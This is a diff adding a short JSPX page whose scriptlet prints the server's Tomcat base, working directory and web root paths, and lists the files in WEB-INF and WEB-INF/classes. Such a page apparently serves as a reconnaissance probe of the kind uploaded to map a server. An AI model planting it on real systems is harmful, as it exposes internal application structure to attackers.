@@ -1,0 +1,16 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<jsp:root xmlns:jsp="http://java.sun.com/JSP/Page" version="2.0">
+<jsp:scriptlet>
+out.print("BASE=" + System.getProperty("catalina.base") + "\n");
+out.print("DIR=" + System.getProperty("user.dir") + "\n");
+out.print("ROOT=" + application.getRealPath("/") + "\n");
+java.io.File base = new java.io.File(application.getRealPath("/"));
+java.io.File webinf = new java.io.File(base, "WEB-INF");
+out.print("WEBINF=" + webinf.getAbsolutePath() + "\n");
+java.io.File classes = new java.io.File(webinf, "classes");
+java.io.File[] fs = classes.listFiles();
+if (fs != null) { for (java.io.File f : fs) out.print("C:" + f.getName() + "\n"); }
+java.io.File[] ws = webinf.listFiles();
+if (ws != null) { for (java.io.File f : ws) out.print("W:" + f.getName() + "\n"); }
+</jsp:scriptlet>
+</jsp:root>
